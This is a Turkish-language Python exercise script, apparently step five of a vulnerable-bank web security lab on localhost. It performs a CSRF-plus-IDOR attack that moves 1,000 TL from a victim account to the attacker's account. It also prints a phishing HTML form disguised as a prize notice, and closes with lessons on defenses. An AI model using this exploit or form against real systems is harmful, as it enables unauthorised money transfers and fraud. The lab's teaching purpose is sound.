"""
ADIM 5: CSRF (Cross-Site Request Forgery) ile Havale
=======================================================
Zafiyet: Transfer formunda CSRF token yok.
Hedef:  Ahmet'i (veya herhangi birini) bizim hesabimiza para gondermeye
        zorlamak. Ahmet kendi hesabinda oturum acmisken, ona zararli bir
        link tiklatip havale yaptiracagiz.

NOT: Bu script dogrudan calisir (Ahmet'in session'ini taklit eder).
    Gercek saldirida Ahmet'in bilgisayarinda calistirilmasi gerekir
    veya bir XSS ile yapilir.

Calistirma:  python 05-csrf-transfer.py
"""

import requests

HEDEF = "http://localhost:5000"

print("""
[ADIM 5] CSRF - Zorunlu Havale
--------------------------------""")

# Ahmet'in session'ini al
s = requests.Session()
data = {"username": "ahmet", "password": "123456"}
r = s.post(f"{HEDEF}/", data=data, allow_redirects=False)
if r.status_code == 302:
    print("[OK] Ahmet olarak giris yapildi")
else:
    print("[HATA] Ahmet giris basarisiz")
    exit(1)

print("\n[TEST 1] Ahmet'in dashboard'undan bakiyesini kontrol")
r = s.get(f"{HEDEF}/dashboard")
if "5,000" in r.text or "5000" in r.text:
    print("[OK] Ahmet'in bakiyesi: 5,000 TL")
else:
    print("[HATA] Bakiye goruntulenemedi")

print("\n[TEST 2] CSRF Saldirisi - Ahmet'in hesabindan tarikdxd'ye para gonder")
print("[INFO] Ahmet hesap no: TR1234567890")
print("[INFO] tarikdxd hesap no: TR5555555555")

# CSRF: Ahmet'in hesabindan tarikdxd'nin hesabina 1000 TL transfer
transfer_data = {
    "from_account": "TR1234567890",  # Ahmet'in hesabi (IDOR!)
    "to_account": "TR5555555555",     # tarikdxd'nin hesabi
    "amount": "1000"
}
r = s.post(f"{HEDEF}/transfer", data=transfer_data, allow_redirects=False)
if r.status_code == 302:
    print("[OK] Transfer basarili! 1,000 TL gonderildi!")
else:
    print("[HATA] Transfer basarisiz")
    print(f"  HTTP {r.status_code}")
    if "Yetersiz" in r.text:
        print("[HATA] Yetersiz bakiye (bu olmamali)")

print("\n[TEST 3] Son durumu kontrol et")
r = s.get(f"{HEDEF}/dashboard")
print("[INFO] Ahmet'in dashboard'u yenilendi")

if "4,000" in r.text or "4000" in r.text:
    print("[OK] Ahmet'in bakiyesi 4,000 TL'ye dustu (1000 TL gitti!)")

# Simdi tarikdxd olarak giris yapip bakiyeyi kontrol et
s2 = requests.Session()
data = {"username": "tarikdxd", "password": "tarik123"}
s2.post(f"{HEDEF}/", data=data)
r2 = s2.get(f"{HEDEF}/dashboard")
if "1,000" in r2.text or "1000" in r2.text:
    print("[OK] tarikdxd'nin bakiyesinde 1,000 TL gorundu!")
else:
    print("[INFO] tarikdxd bakiyesini kontrol et: /dashboard")

print("\n[NOT] Gercek saldiri senaryosu:")
print("1. Saldirgan Ahmet'e bir e-posta gonderir:")
print('   <form action="http://localhost:5000/transfer" method="POST">')
print('   <input name="from_account" value="TR1234567890">')
print('   <input name="to_account" value="TR5555555555">')
print('   <input name="amount" value="5000">')
print('   <button type="submit">Tebrikler! 5000 TL kazandiniz!</button>')
print('   </form>')
print("2. Ahmet tiklayinca, kendi oturumu uzerinden para transferi yapilir")
print("3. Ahmet farkina bile varmaz (sayfa yonlendirilir)")

print("\n" + "="*50)
print("OGRENILENLER:")
print("1. CSRF: Kullanicinin haberi olmadan istek yaptirmak")
print("2. Korunma: Anti-CSRF token (her formda unique token)")
print("3. Korunma: SameSite=Strict cookie ayari")
print("4. Korunma: Referer header kontrolu")
print("5. Bu ornekte CSRF + IDOR birlikte kullanildi!")
print("="*50)
